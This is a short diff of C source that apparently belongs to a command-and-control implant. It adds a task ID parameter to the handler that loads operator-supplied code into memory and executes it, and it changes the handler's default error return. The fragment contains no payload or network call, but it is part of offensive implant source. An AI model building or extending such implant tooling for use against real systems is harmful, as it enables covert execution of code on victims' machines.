@@ -33,6 +33,7 @@ typedef struct
 typedef DWORD ( * INLINE_EXECUTE_FUNC )(
 		PROGUE_API,
 		PROGUE_CTX,
+		USHORT,
 		PVOID,
 		UINT32,
 		PBUFFER
@@ -52,12 +53,12 @@ typedef DWORD ( * INLINE_EXECUTE_FUNC )(
  * Executes a custom inline task and return its output.
  *
 !*/
-D_SEC( B ) DWORD TaskInlineExecute( _In_ PROGUE_CTX Context, _In_ PVOID Buffer, _In_ UINT32 Length, _In_ PBUFFER Output )
+D_SEC( B ) DWORD TaskInlineExecute( _In_ PROGUE_CTX Context, _In_ USHORT Uid, _In_ PVOID Buffer, _In_ UINT32 Length, _In_ PBUFFER Output )
 {
 	API			Api;
 	ROGUE_API		Rpi;
 
-	DWORD			Ret = 0;
+	DWORD			Ret = ErrorAction;
 	SIZE_T			Len = 0;
 
 	PVOID			Mem = NULL;
@@ -87,9 +88,9 @@ D_SEC( B ) DWORD TaskInlineExecute( _In_ PROGUE_CTX Context, _In_ PVOID Buffer, 
 
 		/* Set pointer and execute the inline function */
 		if ( Tsk->ArgLength != 0 ) {
-			Fcn = C_PTR( Mem ); Ret = Fcn( &Rpi, Context, Tsk->Buf[ Tsk->BufLength ], Tsk->ArgLength, Output );
+			Fcn = C_PTR( Mem ); Ret = Fcn( &Rpi, Context, Uid, Tsk->Buf[ Tsk->BufLength ], Tsk->ArgLength, Output );
 		} else {
-			Fcn = C_PTR( Mem ); Ret = Fcn( &Rpi, Context, NULL, 0, Output );
+			Fcn = C_PTR( Mem ); Ret = Fcn( &Rpi, Context, Uid, NULL, 0, Output );
 		};
 
 		/* Cleanup */
